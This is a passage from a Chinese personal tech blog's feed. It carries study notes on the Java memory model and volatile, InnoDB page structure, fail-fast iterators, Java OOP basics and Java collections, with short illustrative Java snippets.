        <content type="html"><![CDATA[<h1 id="内存模型">内存模型</h1>
<p><strong>内存模型</strong>可以理解为在特定的操作协议下，对特定的内存或高速缓存进行读写访问的过程抽象。<br>
在多处理器计算机系统中，每个处理器都有自己的高速缓存，且所有处理器都共享同一主存：<br>
<img src="https://yao177.github.io/post-images/1646200411287.svg" alt="" loading="lazy"></p>
<p><strong>缓存一致性（Cache Coherence）</strong> 是多处理器系统必须解决的问题，当多个处理器的运算任务都涉及同一块主存区域时，将可能导致各处理器的高速缓存数据不一致，这时如何同步回主存就需要缓存一致性协议来协调；</p>
<p><strong>乱序执行（Out-Of-Order Execution）</strong> 也是处理器的一项优化，该优化只保证最终结果的一致性，但不保证各语句的执行顺序与代码中的顺序一致。</p>
<p>Java 内存模型和多处理器计算机系统有着很多相似之处：</p>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646200533914.svg" alt="" loading="lazy"></figure>
<p><strong>内存一致性</strong>：每条线程都有自己的工作内存，里面保存了被该线程使用到的变量的主内存副本拷贝，线程对变量的所有操作都必须在工作内存中进行，不能直接读写主内存中的变量，相似的，Java 虚拟机也定义了一套内存访问协议来保证内存一致性；</p>
<p><strong>指令重排序</strong>：对应于处理器乱序执行，Java 虚拟机的即时编译器中也有着类似的优化，同样只保证最终结果的一致性。</p>
<h1 id="volatile">volatile</h1>
<p>volatile 是 Java 虚拟机提供的最轻量的同步机制，但很难被正确的理解与使用，通过学习 Java 内存模型对 volatile 专门定义的一些特殊访问规则，或许会对理解 volatile 有一定帮助。</p>
<p>当一个变量被定义为 volatile 之后，将会具备两种特性：</p>
<blockquote>
<p>可见性：当一条线程改变了该变量的值，新值对所有其他线程来说都是可以立即感知的；<br>
禁止指令重排序优化：volatile 变量赋值完成语句之后的指令不会被重排序到该赋值指令之前。</p>
</blockquote>
<h2 id="可见性">可见性</h2>
<p>大多数开发人员最容易误解的是 volatile的 可见性特性，会从 volatile 变量在各个线程中是一致的，错误的推导出基于 volatile 变量的运算也是并发安全的，下面一段代码对此进行了实验：</p>
<pre><code class="language-Java">private static volatile int sum = 0;

public static void increase() {
    ++sum;
}

/**
 * 使用10跟线程对sum各累加10000次，理论上返回值为100000
 */
public static void test() {
    try {
        Thread[] threads = new Thread[10];
        for (int i = 0; i &lt; 10; ++i) {
            threads[i] = new Thread(new Runnable() {
                @Override
                public void run() {
                    for (int i = 0; i &lt; 10000; ++i) {
                        increase();
                    }
                }
            });
            threads[i].start();
        }
        //等待所有线程执行完毕
        for (int i = 0; i &lt; 10; ++i) {
            threads[i].join();
        }
        System.out.println(&quot;sum = &quot; + sum);
    } catch (Exception e) {
        //ignore
    }
}


public static void main(String[] args) {
    //实验10次
    for (int i = 0; i &lt; 10; ++i) {
        sum = 0;
        test();
    }
}
</code></pre>
<p>如果基于 volatile 变量的运算也是<em>并发安全</em>的，那输出值应该为 10 个 100000，但事实上返回值均不为 100000。</p>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646200897491.png" alt="" loading="lazy"></figure>
<p>这是因为，Java 中的运算<code>++sum</code>并不是原子操作，我们可以使用反编译来验证</p>
<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1646200993884.png" alt="" loading="lazy"></figure>
<p>通过 Javap 反编译测试代码可以看到，<code>++sum</code>操作产生了四条指令，getstatic 指令把 sum 值取到栈顶，volatile 关键字保证了此时该值是正确的，但是在执行后续<code>iconst_1</code>和<code>iadd</code>指令时，其他线程可能已经完成了一次“++sum”，此时栈顶的 sum 值其实已经过期了，当该线程执行<code>putstatic</code>后，其他线程抢先完成的 ++sum 操作就被覆盖了，最终导致 sum 值小于期望的 100000。</p>
<blockquote>
<p>准确来说，使用 Javap 反编译来分析并发问题并不是严谨的，因为 Javap 反编译得到的一条字节码指令也未必是一个原子操作，比如字节码解释器可能需要运行多行代码才能实现该一条字节码的语义，如果是编译执行，一条字节码指令可能转化成多条本地机器码指令，有兴趣的同学可以自己试一下运行时反汇编</p>
</blockquote>
<p>理解了 volatile 的可见性之后，可以总结出使用场景：</p>
<ol>
<li>运算结果并不依赖变量的当前值（如作为状态变量），或仅有单一线程修改变量值</li>
<li>变量不与其他状态变量共同参与不变约束（因为对其中一个变量值赋值之后并在对其他变量赋值之前，不变约束可能失效）</li>
</ol>
<pre><code class="language-Java">// 当shutdown()被调用时，所有线程的doWork()都会立刻停止
private volatile boolean isShutdown = false;
public void shutdown() {
    isShutdown = true;
}
public void doWork() {
    while(!isShutdown) {
	      // anything
    }
}
</code></pre>
<p>如果不能同时满足上述两个条件，则必须使用锁来保证并发安全</p>
<h2 id="禁止指令重排序优化">禁止指令重排序优化</h2>
<p>在介绍 volatile 的禁止指令重排序优化之前，首先要了解一下线程内表现为串行的语义（Within-Thread As-If-Serial Semantics）和内存屏障（Memory Barrier）</p>
<blockquote>
<p>内存屏障：指令重排序时不能把内存屏障之后的指令重排序到内存屏障之前<br>
线程内表现为串行的语义：普通的变量仅仅会保证在该方法的执行过程中所有依赖赋值结果的地方都能获取到正确的结果，而不能保证变量赋值的操作顺序与程序代码中执行的顺序一致，这在单线程的方法执行过程中是无法感知的，因而表现为线程内串行</p>
</blockquote>
<p>举个栗子：</p>
<pre><code class="language-Java">int a = 1; // L1
int b = 2; // L2
a = a + 1; // L3
a = a * 2; // L4
int c = a; // L5
</code></pre>
<p>以行号代表语句，虚拟机只会保证语句1、3、4顺序执行（四则运算规则），且语句5在语句4之后执行（c对a的依赖关系）；至于语句2，它可能出现在任意位置（以指令重排序优化结果为准），因为它与<code>a</code>和<code>c</code>均没有依赖关系</p>
<p>指令重排序优化对单线程程序没有负面影响，但会干扰程序的并发执行，再举个栗子：</p>
<pre><code class="language-Java">static private boolean initialized = false;

/**
    * 初始化
    */
public static void init() {
    //init task A
    //init task B
    //init task C
    //init task D
    //...
    initialized = true;
}

/**
    * 工作函数，必须在初始化完成后才能开始工作
    */
public static void doWork() {
    try {
        //等待初始化完成
        while (!initialized) {
        }
        //do work A
        //do work B
        //do work C
        //do work D
        //...
    } catch (Exception ign) {
        //ignore
    }
}
</code></pre>
<p>如果<code>init()</code>和<code>doWork()</code>运行在同一线程中，那么可以正常运行，但如果运行在不同线程中，由于指令重排序优化的存在，init() 中的<code>initialized = true;</code>语句可能会被提前执行，这时并发运行在不同线程的 doWork() 就会出现并发问题，而如果将 initialized 定义为 volatile 变量则可以避免这类问题。</p>
<p>那么，volatile 关键字到底是如何禁止指令重排序优化的呢，我们可以通过运行时反汇编来查看加入 volatile 关键字和未加入 volatile 关键字时所生成的汇编码的差别。</p>
<p>这是未加 volatile 关键字的汇编码：</p>
<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1646202478210.png" alt="" loading="lazy"></figure>
<p>这是加了 volatile 关键字的汇编码：</p>
<figure data-type="image" tabindex="5"><img src="https://yao177.github.io/post-images/1646202518393.png" alt="" loading="lazy"></figure>
<p>注释显示这是<code>init()</code>函数的第12行代码产生的汇编码，那么第12行做了什么了呢？</p>
<figure data-type="image" tabindex="6"><img src="https://yao177.github.io/post-images/1646202554738.png" alt="" loading="lazy"></figure>
<p>这行代码对 initialized 变量进行了赋值，加了 volatile 关键字的赋值操作多了<code>lock addl $0x0,(%rsp)</code>这一指令，<code>addl $0x0,(%rsp)</code>的含义是把 ESP 寄存器的值加 0，显然是一个空操作，那关键点就是 <strong>lock 前缀</strong>了。</p>
<p>lock 前缀的作用是使得本 CPU 的 Cache、写入内存，同时会引起其他 CPU 或者内核无效化各自的 Cache，该操作使得 volatile 变量的修改对其他 CPU 立即可见，同时，<code>lock addl $0x0,(%rsp)</code>指令把修改同步到内存时，意味着所有之前的操作都已经执行完毕，这便形成了“指令重排序无法越过内存屏障”的效果，之前的指令无法被重排序到该指令之后，同样，之后的指令无法被重排序到该指令之前。</p>
<h2 id="总结">总结</h2>
<p>最后，我们再看一下 Java 内存模型对 volatile 变量定义的特殊规则：</p>
<ul>
<li>每次使用 volatile 变量之前都必须从主内存刷新最新的值</li>
<li>每次修改完 volatile 变量都必须立刻同步到主内存中</li>
<li>volatile 修饰的变量不会被指令重排序优化</li>
</ul>
<p>可以看到，这三条规则与反汇编得出结论相一致。</p>
<h1 id="先行发生原则">先行发生原则</h1>
<p>Java 内存模型是围绕着如何在并发过程中处理<strong>原子性、可见性和有序性</strong>这三个特征来构建的，前面已经介绍过 volatile 关键字的“禁止指令重排序优化”来保证线程之间操作的有序性，另一个我们常用的保证有序性的手段是 synchronized 关键字；如果 Java 中的所有有序性都要靠这两个关键字来保证，那代码会很繁琐，但我们平时开发时并没有感觉到这一点，这是因为 Java 语言中又一个先行发生原则（happens-before）。</p>
<blockquote>
<p>先行发生原则</p>
</blockquote>
<ul>
<li>程序次序规则 (Program Order Rule)：在一个线程内，按照代码顺序，书写在前面的操作先行发生于书写在后面的操作。准确地说应该是控制流顺序而不是代码顺序，因为要考虑分支、循环等结构。</li>
<li>监视器锁定规则 (Monitor Lock Rule)：一个unlock操作先行发生于后面对同一个对象锁的 lock 操作。这里强调的是同一个锁，而“后面”指的是时间上的先后顺序，如发生在其他线程中的 lock 操作。</li>
<li>volatile变量规则 (Volatile Variable Rule)：对一个 volatile 变量的写操作发生于后面对这个变量的读操作，这里的“后面”也指的是时间上的先后顺序。</li>
<li>线程启动规则 (Thread Start Rule)：Thread 独享的<code>start()</code>方法先行于此线程的每一个动作。</li>
<li>线程终止规则 (Thread Termination Rule)：线程中的每个操作都先行发生于对此线程的终止检测，我们可以通过<code>Thread.join()</code>方法结束、<code>Thread.isAlive()</code>的返回值检测到线程已经终止执行。</li>
<li>线程中断规则 (Thread Interruption Rule)：对线程<code>interrupte()</code>方法的调用优先于被中断线程的代码检测到中断事件的发生，可以通过<code>Thread.interrupted()</code>方法检测线程是否已中断。</li>
<li>对象终结原则 (Finalizer Rule)：一个对象的初始化完成 (构造函数执行结束) 先行发生于它的<code>finalize()</code>方法的开始。传递性 (Transitivity)：如果操作A先行发生于操作B，操作B先行发生于操作C，那就可以得出操作A先行发生于操作C的结论。</li>
</ul>
<p>先行发生原则最容易被误解的地方是，很多人从字面意思上理解这些规则，以“监视器锁定规则 (Monitor Lock Rule)”为例：</p>
<p>一个 unlock 操作先行发生于后面对同一个对象锁的 lock 操作，这句话不是字面意义上，针对同一个锁 lock 方法必须在 unlock 方法之后调用（虽然咋看起来没毛病，排他锁确实只能被一个线程lock住。。。），这句话的意思是，<em>当线程A解锁了 monitor，接着线程B锁住了该 monitor，那么，线程A在解锁之前所有的写操作对线程B而言都是可见的</em>。</p>
<p>同样，对于 volatile 变量规则( Volatile Variable Rule)，<em>如果线程A写入了 volatile 变量v，接着线程B读取了v，那么，线程A写入v以及之前的所有写操作都对线程B可见</em>（无效化了除线程A以外的所有线程的工作内存）。</p>
<p>其他规则就不一一赘述。</p>
<p>总之，一句话总结：</p>
<p><strong>衡量并发安全问题时不要受到时间顺序的干扰，一个操作“时间上的先发生”并不意味着“先行发生”，一切必须以先行发生原则为准，如果不满足任何一条先行发生原则，那么就是线程不安全的（指令重排序会给你足够多的惊喜）。</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[数据库｜InnoDB 学习]]></title>
        <id>https://yao177.github.io/post/innodb-study/</id>
        <link href="https://yao177.github.io/post/innodb-study/">
        </link>
        <updated>2021-02-01T06:07:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="b-树">B+ 树</h1>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646119612971.png" alt="B+树示意" loading="lazy"></figure>
<ul>
<li>叶子节点真正存储数据</li>
<li>相邻叶子节点通过双向链表连接</li>
<li>每个叶子节点存储了1页（page）数据，页通常是 16K，文件系统页通常为 4K，硬盘页通常为 512字节<br>
<img src="https://yao177.github.io/post-images/1646122945576.png" alt="" loading="lazy"><br>
假设每个数据行大小为rK，主键为bigint（8字节），页指针为6字节，则一个非叶子节点能存储16k/14 = 1170 个字节点信息。（为什么指针大小为6字节）<br>
<img src="https://yao177.github.io/post-images/1646123070143.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646123090655.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646123151296.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646123173338.png" alt="" loading="lazy"></li>
</ul>
<h3 id="虚拟最大最小记录infimum-and-supremum-records">虚拟最大最小记录(Infimum and Supremum Records)</h3>
<p>最大记录是这个数据页中逻辑上最大的记录，所有用户的记录都小于它。最小记录是数据页上最小的记录，所有用户记录都大于它。他们在数据页被创建的时候创建，而且不能被删除。引入他们主要是方便页内操作。</p>
<h2 id="user-records">User Records</h2>
<p>在页的7个组成部分中，存储的记录会按照指定的行格式存储到User Records部分。但是在一开始生成页的时候，其实并没有User Records这个部分，每当插入一条记录，都会从Free Space部分，也就是尚未使用的存储空间中申请一个记录大小的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使用完了，如果还有新的记录插入的话，就需要去申请新的页了。</p>
<h2 id="free-space">Free Space</h2>
<p>从PAGE_HEAP_TOP开始，到最后一个数据目录，这之间的空间就是空闲空间，都被重置为0，当用户需要插入记录时候，首先在被删除的记录的空间中查找，如果没有找到合适的空间，就从这里分配。空间分配给记录后，需要递增PAGE_N_RECS和PAGE_HEAP_TOP。</p>
<h2 id="page-directory">Page Directory</h2>
<p>用户的记录是从低地址向高地址扩展，而数据目录则相反。在数据页被初始化的时候，就会在数据页最后(当然在checksum之前)创建两个数据目录，分别指向最大和最小记录。之后插入新的数据的时候，需要维护这个目录，例如必要的时候增加目录的个数。每个数据目录占用两个字节，存储对应记录的页内相对位置，每个目录称为一个槽Slots。假设目录N，这个目录N管理目录N-1(不包括)和目录N之间的记录，我们称目录N own 这些记录。在目录N指向的记录中，字段n-owned会记录own记录的数量。由此可见，目录own的记录不能太多，因为太多的话，即意味着目录太过稀疏，不能很好的提高查询效率，但同时也不能own太少，这会导致目录数量变多，占用过多的空间。在InnoDB的实现中，伪记录Infimum的n_owned值总是1，记录supremum的n_owned的取值范围为[1，8]，其他用户记录n_owned的取值范围是[4，8]，平均是6个记录，如果超过这个数量，就需要重新均衡目录的数量。目录的增加和删除可能需要进行内存拷贝，但是由于目录占用的总体空间很小，开销可以忽略不计。</p>
<p>由于在InnoDB中Page Directory是稀疏目录，二叉查找的结果只是一个粗略的结果，因此InnoDB必须通过recorder header中的next_record来继续查找相关记录。同时，Page Directory很好地解释了recorder header中n_owned值地含义，因为这些记录并包括在Page Directory中。B+树索引本身并不能找到具体的一条记录，能找到的只是该记录所在的页。数据库把页载入到内存，然后通过Page Directory再进行二分查找。二分查找的时间复杂度很低，同时再内存中的查找很快，因此通常忽略这部分查找所用的时间。</p>
<h2 id="file-trailer">File Trailer</h2>
<p>为了检测页是否已经完整的写入磁盘（如可能发生的写入过程中磁盘损坏、机器关机等），InnoDB存储引擎的页中设置了File Trailer部分。</p>
<p>这个部分处于数据页最后的位置，只有8个字节。低地址的四个字节存储checksum的值，高地址的四个字节和File Header中的FIL_PAGE_LSN的低位四字节相同。注意这里的checksum的值不一定与FIL_PAGE_SPACE_OR_CHKSUM的相同，这个依赖不同的checksum计算方法。</p>
<p>默认配置下，InnoDB每次从磁盘读取一个页就会检测该页的完整性，即页是否发生Corrupt，这就是通过File Traile部分来进行检测，而该部分的检测会有一定的开销。我们可以通过参数innodb_checksums来开启或关闭对这个页完整性的检查。</p>
<blockquote>
<p>参考资料<br>
《极客时间：B+树：MySQL数据库索引是如何实现的？》</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜快速失败机制]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-orkuai-su-shi-bai-ji-zhi/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-orkuai-su-shi-bai-ji-zhi/">
        </link>
        <updated>2020-09-15T12:56:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="基本介绍">基本介绍</h1>
<p>在使用迭代器对集合对象进行遍历的时候，如果 A 线程对集合进行遍历，正好 B 线程对集合进行修改（增加、删除、修改）则 A 线程会抛出 <code>ConcurrentModificationException</code> 异常。</p>
<h1 id="原理">原理</h1>
<p>迭代器在遍历时直接访问集合中的内容，并且在遍历过程中使用一个 modCount 变量。集合在被遍历期间如果内容发生变化，就会改变 modCount 的值。每当迭代器使用 hashNext()/next() 遍历下一个元素之前，都会检测 modCount 变量是否为 expectedmodCount 值，是的话就返回遍历；否则抛出异常，终止遍历。</p>
<h2 id="为什么-util-中的集合类遍历时不会快速失败">为什么 util 中的集合类遍历时不会快速失败？</h2>
<p>异常的抛出条件是检测到 modCount ≠ expectedmodCount 这个条件，而遍历时发生变化会同事给 expectedmodCount 值 +1，因此不会出现问题</p>
<h2 id="javautil-中哪些集合不能在多线程下使用">java.util 中哪些集合不能在多线程下使用？</h2>
<p>都不可以，都是快速失败的，不能在多线程下发生并发修改</p>
<h1 id="安全失败">安全失败</h1>
<p>采用安全失败机制的集合容器，在遍历时不是直接在集合内容上访问的，而是先复制原有集合内容，在拷贝的集合上进行遍历。</p>
<p>因此，安全失败时，迭代器不能访问修改后的内容</p>
<p>java.util.concurrent 都是安全失败，可以在多线程下并发使用和修改</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜几个小疑惑]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-orji-ge-xiao-yi-huo/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-orji-ge-xiao-yi-huo/">
        </link>
        <updated>2020-09-15T12:53:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="为什么要有-object-类">为什么要有 Object 类？</h1>
<p>可以理解为一个基础的模版类，提供 <code>hashcode()</code>、<code>compareTo()</code>、<code>toString()</code> 等基础函数模版</p>
<h1 id="对象变量和引用的关系">对象变量和引用的关系？</h1>
<p>每个对象变量都属于一个类型</p>
<p>子类引用赋给超类时，OK</p>
<p>超类引用赋给子类时，必须进行类型转换（类似 C++ 中的 dynamic_cast 操作）；先用 instanceof 检验一下是否可以转换</p>
<pre><code class="language-java">if (staff[1] instanceof Manager) {	
		boss = (Manager) staff[1]; // OK	...
}
String c = (String) staff[1]; // Fail
</code></pre>
<ul>
<li>只能在继承层次内进行类型转换</li>
<li>在将超类转换成子类之前，应该使用 instanceof 进行检查</li>
<li>多态的动态绑定机制可以自动找到响应方法，只有在使用「特定方法」时才会需要类型转换——超类的设计不够合理</li>
</ul>
<h1 id="null-检查应该在什么时候">null 检查应该在什么时候</h1>
<p>给别人前，拿到之后</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜OOP 面向对象]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-ormian-xiang-dui-xiang/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-ormian-xiang-dui-xiang/">
        </link>
        <updated>2020-09-15T12:51:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="基础">基础</h1>
<p>数据第一位，适合规模较大的使用场景</p>
<ul>
<li>行为 behavior：public 方法</li>
<li>状态 state：被动通过调用方法改变</li>
<li>标识 identity</li>
</ul>
<p>开发流程：设计类，添加方法</p>
<h3 id="类间关系">类间关系</h3>
<ul>
<li>依赖「uses-a」</li>
<li>聚合「has-a」</li>
<li>继承「is-a」</li>
</ul>
<p>这是 PlantUML 的中文教程，可以用纯代码的方式画 UML 图（原理类似于 Markdown 语法）</p>
<p>PlantUML_Language_Reference_Guide_zh.pdf2.00MB</p>
<h3 id="对象引用">对象引用</h3>
<p>比较像 C++ 中的对象指针，不拷贝无副本</p>
<p>想要实现深拷贝需要使用 clone 方法</p>
<p>clone 真的是深拷贝吗？尝试后发现，引用类型属性更改后同时更改 -&gt; 浅拷贝！</p>
<p>想要深拷贝，必须实现 Cloneable，并覆写 clone 方法 -&gt; 代码繁琐</p>
<p>搜索后得知，可以使用序列化对象的方法——将对象转成二进制流，然后再把二进制流反序列成一个java对象，这时候反序列化生成的对象是一个全新的对象，里面的信息与原对象一样，但是所有内容都是一份新的</p>
<p>所有类都需要实现 Serializable 接口，以便进行序列化操作</p>
<pre><code class="language-java">public class DeepClone implements Serializable{
		private static final long serialVersionUID = 1L;
		/** 
			* 利用序列化和反序列化进行对象的深拷贝 
			* @return * @throws Exception 
			*/	
		protected Object deepClone() throws Exception{	
		//序列化	
		ByteArrayOutputStream bos = new ByteArrayOutputStream();	
		ObjectOutputStream oos = new ObjectOutputStream(bos);	
		oos.writeObject(this);	
		//反序列化	
		ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());	
		ObjectInputStream ois = new ObjectInputStream(bis);	
		return ois.readObject();	
		}
}
</code></pre>
<h3 id="更改器-访问器">更改器 访问器</h3>
<p>Date 类、LocalDate 类、GregorianCalendar 类</p>
<p>访问器方法：LocalDate 在调用 plusDays 方法后会生成一个新的对象，而不会更改本来的 LocalDate 对象（类似 toUpperCase）</p>
<p>更改器方法：GregorianCalendar 类调用 add 方法时就会更改现有对象状态</p>
<h3 id="对象创建-方法">对象创建 方法</h3>
<ul>
<li>在堆中</li>
<li>需要用 new 操作符</li>
<li>区别于 C++（<code>Object::Fuction()</code>），直接在类内部定义即可（JVM 决定是否内联）</li>
</ul>
<h3 id="封装">封装</h3>
<p>一个私有数据域 + 一个公有域访问器方法 + 一个公有域更改器方法</p>
<p>不要编写返回引用可变对象的访问器方法｜一个可变数据域的拷贝，实在需要必须先 clone</p>
<p>public &gt; default（默认，package 内） &gt; protected &gt; private</p>
<h3 id="final-修饰符">final 修饰符</h3>
<ol>
<li>应修饰「基本类型」/「不可变类」的数据域</li>
<li>若修饰一个可变类，只是限制了不可以引用其它对象，但该对象可以更改</li>
</ol>
<h3 id="static-修饰符">static 修饰符</h3>
<ol>
<li>静态域（private static 数据域）：类对象共享，可修改，只能用类名+方法访问</li>
<li>静态常量（public static final 数据域）：Math.PI, System.Out</li>
<li>静态方法（static 方法）：无 this 参数 -&gt; 不能访问实例域；可以访问静态域，可以用对象变量调用</li>
<li>工厂方法（工厂模式——定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行）：使用静态方法构造对象</li>
<li>main 方法：每个类都可以有一个 main 方法（常用于测试），可单独运行也可运行这个项目</li>
</ol>
<h3 id="修饰符顺序">修饰符顺序</h3>
<p>Java 语言规范建议按以下顺序列出修饰符：</p>
<ol>
<li>Annotations</li>
<li>public</li>
<li>protected</li>
<li>private</li>
<li>abstract</li>
<li>static</li>
<li>final</li>
<li>transient</li>
<li>volatile</li>
<li>synchronized</li>
<li>native</li>
<li>strictfp</li>
</ol>
<h3 id="方法の参数">方法の参数</h3>
<p>基本类型复制拷贝，对象引用使用引用值（依然是值，相当于一个 final）即不能进行新的引用</p>
<h1 id="对象构造">对象构造</h1>
<h3 id="重载-overloading-resolution">重载 overloading resolution</h3>
<p>唯一性——方法签名（signature）</p>
<ul>
<li>方法名</li>
<li>参数类型</li>
<li><s>返回类型</s></li>
</ul>
<p>和 C++ 中一样，如果方法名和参数类型都一致而返回类型不一致，就会报错——重复定义方法</p>
<h3 id="构造函数">构造函数</h3>
<ol>
<li>默认构造为默认数值</li>
</ol>
<ul>
<li>数值：0</li>
<li>布尔值：False</li>
<li>对象引用：null</li>
</ul>
<p>不推荐使用默认构造，因为当使用 getXxx 方法时，会获得一个 null 引用</p>
<p>this 可以调用另一个构造起</p>
<ol start="2">
<li>如果写了构造器，那就必须包括一个无参构造 / 显式域初始化（声明中赋值）/ 初始化块（{这里进行初始化}）</li>
</ol>
<p>静态初始化块可以方便得对静态域进行初始化</p>
<pre><code class="language-java">// static initialization block
static {	
		Random generator = new Random();	
		nextId = generator.nextInt(1000);
}
</code></pre>
<p>析构：因为 GC 机制，Java 不支持析构器</p>
<h3 id="导入类">导入类</h3>
<p>import package 中，「<em>」只可以导入一个包，而不可以使用 import java.</em> 或者 import java.<em>.</em>；与 C++ 中不同的是，include 必须添加以载入外部特性，而 Java 中给全包名可以不使用 import，类似于 using namespace。也可以导入静态方法和静态域，import lang.System.out;</p>
<p>类放入包，package com.x.xx.xxx 对应文件目录为 com/x/xx/xxx 中，如果不匹配，虚拟机就找不到类（可编译不可运行）。</p>
<h3 id="类设计">类设计</h3>
<ol>
<li>
<p>数据私有</p>
</li>
<li>
<p>数据初始化</p>
</li>
<li>
<p>用其它类代替多个相关的基本类型：便于处理</p>
<pre><code class="language-java">private String street;
private String city;
private String state;
private int zip;
// turn to class Address
private Address addr;
</code></pre>
</li>
<li>
<p>不是所有的域都需要独立的域访问器和域更改器：会有一些私有不想被外界修改的实例域</p>
</li>
<li>
<p>将职责过多的类进行分解</p>
</li>
<li>
<p>类名和方法名能够体现他们的职责：类名通常是带有形容词修饰的名次，方法通常是动宾结构</p>
</li>
<li>
<p>优先使用不可变的类：计算生成返回新值，而不是修改更新原来的值；一些情况会很奇怪</p>
</li>
</ol>
<h1 id="继承">继承</h1>
<p>superclass 超类，subclass 子类；通用方法放超类，特殊用途放子类</p>
<h3 id="覆盖-override">覆盖 override</h3>
<pre><code class="language-java">public class Manager extends Employee {	
		... 
		public double getSalary() {	
				return salary + bonus; // won't work	
				return getSalary() + bonus; // still won't work	
				return super.getSalary() + bonus; // works	
				... 
				} 
		...
}
</code></pre>
<ul>
<li>使用 super 调用超类的方法</li>
<li>不是引用，不能赋给另一个对象变量</li>
<li>也可用 super 调用超类的构造器</li>
</ul>
<h2 id="多态">多态</h2>
<ul>
<li>同一个变量可以引用一个超类对象，也可以引用它的任一子类对象</li>
<li>置换法则：程序中出现超类对象的任何地方都可以用子类对象置换</li>
<li>子类的引用可以转为超类的引用，但超类的引用无法赋给子类变量</li>
<li>子类数组引用可以转换为超类数组引用，再赋值为超类时会导致类型错误</li>
<li>private、static、final 方法时，准确知道调用哪个方法，称为静态绑定（static binding）</li>
<li>动态绑定（dynamic binding），VM 维护一个方法表（method table）查找调用方法</li>
<li>子类方法不能低于超类方法的可见性，尽量将通用域和方法都放在超类中</li>
<li>调用方法过程：VM 提取类的实际类型的<em>方法表</em>，然后搜索定义该方法签名的类（此时）</li>
</ul>
<h3 id="抽象类">抽象类</h3>
<ul>
<li>占位，不可实例化，具体实现在子类中</li>
<li>抽象类对象只能引用非抽象子类对象；</li>
</ul>
<h3 id="object-所有类的超类">Object 所有类的超类</h3>
<p>定义子类 equals 需要先调用超类的 equals，再比较子类中的实例域</p>
<p>防止可能为 null，使用 Objects.equals 方法判断</p>
<p>equals 要求：自反性、对称性、传递性、一致性</p>
<p>覆盖超类方法时使用 @Override 进行标记</p>
<p>默认的 hashCode 散列码为对象的存储地址（String 有着相同的散列码，StringBuilder 没有定义所以不同）；Objects.hash 可以提供多个参数；Arrays.hashCode</p>
<p>toString：类名 + [域值]；x.toString == &quot;&quot;+x 会自动调用 toString；Arrays.toString / Array.deepToString 多维数组</p>
<h3 id="泛型数组列表">泛型数组列表</h3>
<p>ArrayList&lt;type_parameter&gt;() 采用类型参数的泛型类，类似 C++ 中的 vector 模版，确认大小不再变化后可以调用 trimToSize 方法，让 GC 回收多余的存储空间；使用 add、get、set 访问和修改</p>
<h3 id="包装器-自动装箱">包装器 &amp; 自动装箱</h3>
<p>前六个有共同的超类 Number，Void 即 null</p>
<p>可自动拆箱、装箱；包装器对象比较时调用 equals 方法；装箱时 null 会报空指针异常；包装器都是 final 不可变的</p>
<h3 id="参数数量可变的方法">参数数量可变的方法</h3>
<p>fuction(String mine, Object... args) {}</p>
<p>防止重载相同的错误 <a href="https://www.cnblogs.com/lanxuezaipiao/p/3190673.html">https://www.cnblogs.com/lanxuezaipiao/p/3190673.html</a></p>
<h1 id="几个小问题">几个小问题</h1>
<ol>
<li>什么时候用继承，继承和组合的关系是什么：is、has聚合/contain组合</li>
<li>什么是多态，在继承的体系中是怎么样的，为什么要用多态：同样方法，不同对象，不同实现；子类方法被超类所用，维护扩展</li>
<li>重载和重写的区别：都是多态</li>
<li>值传递和引用传递：基本类型传值，对象传地址（值）</li>
<li>自动拆装箱的使用（什么时候）：表达式计算——先拆再算后装，类型转换 toString</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 基础｜Java 集合]]></title>
        <id>https://yao177.github.io/post/java-ji-chu-orjava-ji-he/</id>
        <link href="https://yao177.github.io/post/java-ji-chu-orjava-ji-he/">
        </link>
        <updated>2020-09-15T10:09:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="总述">总述</h1>
<ul>
<li><em>Collection</em>
<ul>
<li><em>List</em>：有序可重
<ul>
<li><em>LinkedList</em></li>
<li><em>ArrayList</em></li>
</ul>
</li>
<li><em>Set</em>：不可重
<ul>
<li><em>HashSet</em>：无序；类 HashMap</li>
<li><em>LinkedHashSet</em>：有序；类 LinkedHashMap</li>
<li><em>TreeSet</em>：无序；类 TreeMap</li>
</ul>
</li>
</ul>
</li>
<li><em>Map</em>：不可重
<ul>
<li><em>HashMap</em>：无序</li>
<li><em>LinkedHashMap</em>：有序</li>
<li><em>TreeMap</em>：无序</li>
</ul>
</li>
</ul>
<hr>
<h1 id="单独详解">单独详解</h1>
<h2 id="linkedlist">LinkedList</h2>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1600164949835.png" alt="LinkedList 类图" loading="lazy"></figure>
<h3 id="基本介绍">基本介绍</h3>
<ol>
<li>双向链表，头尾双指针</li>
<li>队列使用：头进尾出，FIFO；栈使用：头进头出，FILO</li>
<li>无限扩容</li>
<li>功能上类似 ArrayList + ArrayDeque</li>
</ol>
<h3 id="是否有虚拟头节点">是否有虚拟头节点？</h3>
<ol>
<li>无</li>
<li>添加和删除时会判断是否为唯一节点</li>
</ol>
